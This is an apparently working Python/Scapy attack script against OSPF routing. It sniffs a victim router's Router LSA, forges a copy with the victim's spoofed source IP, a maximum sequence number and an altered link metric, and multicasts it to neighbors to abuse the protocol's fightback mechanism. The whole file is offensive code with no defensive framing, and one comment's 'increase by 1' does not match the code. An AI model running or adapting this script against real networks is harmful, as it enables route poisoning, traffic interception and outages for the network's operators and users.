#! /usr/bin/env python


import sys
import argparse

"""
Import Scapy avoiding error printing on the console.
"""
sys.stderr = None
from scapy.all import *
sys.stderr = sys.__stderr__

#####################################################
# Utils functions		 							#
#####################################################

"""
Checks if the incoming packet is an OSFP LS Update packet
sent from the victim router.
"""
def check_incoming_packet(victim, pkt):
	if OSPF_Router_LSA in pkt:
		for lsa in pkt[OSPF_LSUpd].lsalist:
			if OSPF_Router_LSA in lsa:
				if lsa[OSPF_Router_LSA].adrouter == victim and pkt[IP].src == victim:
					return True
	return False

"""
Returns the position of the victim router LSA taken from the originally captured packet
"""
def get_victim_lsa_index(victim_ip, pkt):
	position = 0
	if OSPF_Router_LSA in pkt:
		for lsa in pkt[OSPF_LSUpd].lsalist:
			if OSPF_Router_LSA in lsa:
				if lsa[OSPF_Router_LSA].adrouter == victim_ip:
					break
				position += 1
	return position



if __name__ == '__main__':

	"""
    Load the Scapy's OSPF module
    """
	load_contrib("ospf")

	"""
	Getting arguments from the command line
	"""
	parser = argparse.ArgumentParser()
	parser.add_argument("-v", "--victim_ip", help="[mandatory] The interface IP address of the victim router")
	parser.add_argument("-n", "--neighbor_ip", help="[mandatory] The IP to send the disguised LSA to (the neighbor of the victim router)")
	parser.add_argument("-i", "--iface", help="[mandatory] The interface to use for sniffing and sending packets")

	args = parser.parse_args()

	if 	(args.victim_ip == None or
		args.iface == None or
		args.neighbor_ip == None):
		
		parser.print_help()
		sys.exit(1)
	
	#####################################################
	# Initial configuration 							#
	#####################################################

	"""
	This is the IP address of the router we want to "spoof" (the one which receives the trigger packet).
	"""
	victim_ip = args.victim_ip

	"""
	This is the IP address of a neighbor of the victim router, to which the disguised LSA is sent.
	"""
	
	neighbor_ip = args.neighbor_ip

	"""
	This is the interface to use for both sniffing and sending packets.
	"""
	iface = args.iface

	print("[+] Staring sniffing for LSUpdate from the victim's router...")

	#####################################################
	# Sniffing for the original package					#
	#####################################################

	"""
	Sniff all the OSFP packets and stop when the first OSPF Router LSA is received.
	"""
	pkts = sniff(filter="proto ospf", iface=iface, stop_filter=lambda x: check_incoming_packet(victim_ip, x))

	"""
	Get the last packet and copy it.
	"""
	pkt_orig = pkts[-1].copy()

	#####################################################
	# Prepare the triggering packet 					#
	#####################################################

	print("[+] Preparing trigger packet...")

	"""
	We prepare an ad-hoc trigger packet, containing only one Router LSA: this is
	taken from the original package sent by the victim router.
	"""
	pkt_trig = pkts[-1].copy()
	victim_lsa_index = get_victim_lsa_index(victim_ip, pkt_orig)

	"""
	To be effective, the sequence of the LSA has to be increased by 1.
	"""

	"""
	Now that the packet is ready, we let Scapy recalculate length, checksums, etc..
	Moreover, we update the source and destionatio IPs, and the source IP in the OSPF
	header.
	"""
	pkt_trig[IP].src = victim_ip
	pkt_trig[IP].dst = "224.0.0.5"
	pkt_trig[IP].chksum = None
	pkt_trig[IP].len = None
	pkt_trig[OSPF_Hdr].src = neighbor_ip
	pkt_trig[OSPF_Hdr].chksum = None
	pkt_trig[OSPF_Hdr].len = None
	pkt_trig[OSPF_Router_LSA][OSPF_Link].metric = 30
	pkt_trig[OSPF_Router_LSA].seq = 2147483647
	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len = None
	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].chksum = None
	print(pkt_trig.show())

	"""
	Send original packet to trigger the fightback mechanism and the disguised LSA package.
	"""
	time.sleep(30)
	sendp([pkt_trig], iface=iface)